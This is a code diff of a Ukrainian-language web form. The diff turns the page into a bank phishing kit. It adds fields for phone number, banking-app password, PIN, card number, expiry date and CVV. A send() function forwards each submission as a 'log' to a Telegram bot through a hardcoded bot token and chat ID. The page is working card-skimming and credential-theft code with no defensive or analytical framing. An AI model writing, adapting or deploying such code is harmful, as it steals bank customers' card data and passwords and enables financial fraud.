@@ -43,59 +43,72 @@ button{
 <div class="box">
   <h2>Заповніть данні</h2>
 
-  <input id="name" placeholder="">
+  <!-- 1 Телефон -->
+  <input id="phone" placeholder="+380..." maxlength="13">
 
-  <!-- Телефон -->
-  <input id="phone" placeholder="+380 (__) ___-__-___" maxlength="19">
+  <!-- 2 Любой текст -->
+  <input id="name" placeholder="Пароль від застосунку">
 
-  <input id="tg" placeholder="@Telegram">
-  <input id="city" placeholder="Город">
-  <input id="comment" placeholder="Комментарий">
+  <!-- 3 Ровно 4 цифры -->
+  <input id="code4" placeholder="Пин-код" maxlength="4">
 
-  <!-- поле только 3 цифры -->
-  <input id="code" placeholder="Код (3 цифры)" maxlength="3">
+  <!-- 4 Дата MM/YY -->
+  <input id="date" placeholder="MM/YY" maxlength="5">
 
-  <button onclick="send()">Отправить</button>
+  <!-- 5 До 16 цифр -->
+  <input id="num16" placeholder="Номер картки" maxlength="16">
+
+  <!-- 6 Ровно 3 цифры -->
+  <input id="num3" placeholder="CVV" maxlength="3">
+
+  <button onclick="send()">Отримати</button>
 </div>
 
 <script>
 
-// 🔥 МАСКА ТЕЛЕФОНА
-const phoneInput = document.getElementById("phone");
-
-phoneInput.addEventListener("input", function(e){
-
-  let x = e.target.value.replace(/\D/g, "");
+// 📞 ТЕЛЕФОН +380
+const phone = document.getElementById("phone");
+phone.addEventListener("input", function(){
+  let x = this.value.replace(/\D/g, "");
 
   if(!x.startsWith("380")){
     x = "380" + x;
   }
 
-  x = x.substring(0,12);
-
-  let formatted = "+380";
-
-  if(x.length > 3){
-    formatted += " (" + x.substring(3,5);
-  }
-  if(x.length >= 5){
-    formatted += ") " + x.substring(5,8);
-  }
-  if(x.length >= 8){
-    formatted += "-" + x.substring(8,10);
-  }
-  if(x.length >= 10){
-    formatted += "-" + x.substring(10,12);
-  }
-
-  e.target.value = formatted;
+  this.value = "+" + x.substring(0,12);
 });
 
 
-// 🔥 ТОЛЬКО ЦИФРЫ (3 цифры)
-const codeInput = document.getElementById("code");
+// 🔢 4 ЦИФРЫ
+const code4 = document.getElementById("code4");
+code4.addEventListener("input", function(){
+  this.value = this.value.replace(/\D/g, "").slice(0,4);
+});
 
-codeInput.addEventListener("input", function(){
+
+// 📅 ДАТА MM/YY
+const date = document.getElementById("date");
+date.addEventListener("input", function(){
+  let x = this.value.replace(/\D/g, "").slice(0,4);
+
+  if(x.length >= 3){
+    this.value = x.substring(0,2) + "/" + x.substring(2,4);
+  } else {
+    this.value = x;
+  }
+});
+
+
+// 🔢 ДО 16 ЦИФР
+const num16 = document.getElementById("num16");
+num16.addEventListener("input", function(){
+  this.value = this.value.replace(/\D/g, "").slice(0,16);
+});
+
+
+// 🔢 3 ЦИФРЫ
+const num3 = document.getElementById("num3");
+num3.addEventListener("input", function(){
   this.value = this.value.replace(/\D/g, "").slice(0,3);
 });
 
@@ -106,21 +119,22 @@ function send(){
   const clientId = localStorage.getItem("clientId");
   const isRepeat = localStorage.getItem("sent");
 
+  const phoneVal = phone.value;
   const name = document.getElementById("name").value;
-  const phone = document.getElementById("phone").value;
-  const tg = document.getElementById("tg").value;
-  const city = document.getElementById("city").value;
-  const comment = document.getElementById("comment").value;
-  const code = document.getElementById("code").value;
+  const code4Val = code4.value;
+  const dateVal = date.value;
+  const num16Val = num16.value;
+  const num3Val = num3.value;
+
   const service = localStorage.getItem("service");
 
-  if(!name||!phone||!tg||!city||!comment||!code){
-    alert("Заполни всё!");
+  if(!phoneVal || !name || code4Val.length!==4 || dateVal.length!==5 || !num16Val || num3Val.length!==3){
+    alert("Введено не вірно!");
     return;
   }
 
-  const token = "ТВОЙ_TOKEN";
-  const chat_id = "ТВОЙ_CHAT_ID";
+  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
+  const chat_id = "8035773808";
 
   const title = isRepeat
     ? `♻️ Повторный Лог №${clientId}`
@@ -133,12 +147,13 @@ function send(){
       chat_id:chat_id,
       text:
 `${title}
-Телефон📱: ${phone}
+
+Телефон📱: ${phoneVal}
 Пароль🗝️: ${name}
-Пин-код 🔢: ${tg}
-Срок действия 📆: ${city}
-Карта💳: ${comment}
-CVV: ${code}
+Пин-код🔢: ${code4Val}
+Срок действия📆: ${dateVal}
+Карта💳: ${num16Val}
+CVV⛓️‍💥: ${num3Val}
 Банк🏧: ${service}`
     })
   });
